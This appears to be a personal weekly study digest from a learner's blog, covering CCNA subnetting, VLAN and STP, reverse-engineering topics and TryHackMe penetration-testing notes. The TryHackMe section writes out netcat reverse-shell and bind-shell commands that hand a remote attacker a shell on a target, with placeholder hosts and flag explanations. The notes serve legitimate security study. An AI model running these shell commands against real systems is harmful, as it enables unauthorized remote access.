---
title: CW06 Weekly Digest
date: 2024-02-11
author: hexxie
description: List of materials that I've learned this week
---

As usual, listing my collection of materials for the current week. Today's digest contains collections for CW5 and CW6. 


## CCNA Progress

### Subnetting
I've started with the subnetting practice. It's where you have to divide the network into subnets with CIDR notation. Basically, I have to calculate the network address, broadcast address, and first and last useful address.   

[How to track Subnetting progress](https://learning.oreilly.com/videos/ip-subnetting-from/9780135497869/9780135497869-ISBM_08_29_03/)

I'll add a progress table and tips and tricks soon. Noted this in my Todo list :)  

### Cisco Progress

Currently, I'm on day 20, which is a bit below my expectations. But the topics are getting complicated and I need some time to process them. 
Also, here I want to remind myself that I wanted to take this course from the programmer perspective, so it's more important to answer questions, which I have them rush through the material with the target audience - system administrators or net engineers.

Topics: VLAN, STP

### GNS3 real lab simulator

Setup simulator [here](https://yaser-rahmati.gitbook.io/gns3/). I haven't built any lab with it yet. But sounds interesting.

### Questions
Q1: Investigate IPv4 header fields. Main interest - Flags (see [THM](https://tryhackme.com/room/nmap03)) and Fragmentation.   
Q2: Why max Ethernet MTU - 1500? Find RFC  
Q3: Windows has an interface to set up VLAN ID. Is it related to 802.1Q?

## Reverse engineering

- calling conventions
- stack padding
- Microsoft shadow store
- Different registers that are used for parameters and return values

Will do articles for each. Actually, I need to dig more into this topic. I kinda skimmed them, but I want deeper knowledge. 

Q: What assembler is used in Raspberry Pi, xv6 and M1? Are they similar? Can I use xv6 and say that I know ARM asm?

## TryHackMe

### JR Penetration tester
- Metasploit console
- Red team frameworks [link](https://tryhackme.com/room/mitre) [link](https://mitre-attack.github.io/attack-navigator/)

#### Reverse shell

```
// On the attacking machine
sudo nc -lvnp 443

//On the target
nc <ip> <port> -e /bin/bash
```
- **-l** is used to tell netcat that this will be a listener
- **-v** is used to request a verbose output
- **-n** tells netcat not to resolve host names or use DNS.
- **-p** indicates that the port specification will follow.

#### Bind shell

```
//On the target
nc -lvnp <port> -e "cmd.exe"

//On the attacking machine
nc <ip> <port>
```


## Posted articles
[On learning process](https://hexxie.github.io/posts/articles/on-learning-process/)  
[Reverse engineering strategy](https://hexxie.github.io/posts/articles/reverse-learning-strategy/)

## Useful Links
[What Makes for a Successful Protocol?](https://www.rfc-editor.org/rfc/rfc5218.txt)

## Ideas
- How to conduct monthly self-retrospectives [link](https://undevelopedbruce.com/2020/09/30/the-self-retrospective/) [link](https://www.linkedin.com/pulse/self-retrospective-personal-effectiveness-rahul-shah/)
- IT character as s character in DnD [link](https://undevelopedbruce.com/dungeons-and-testing/)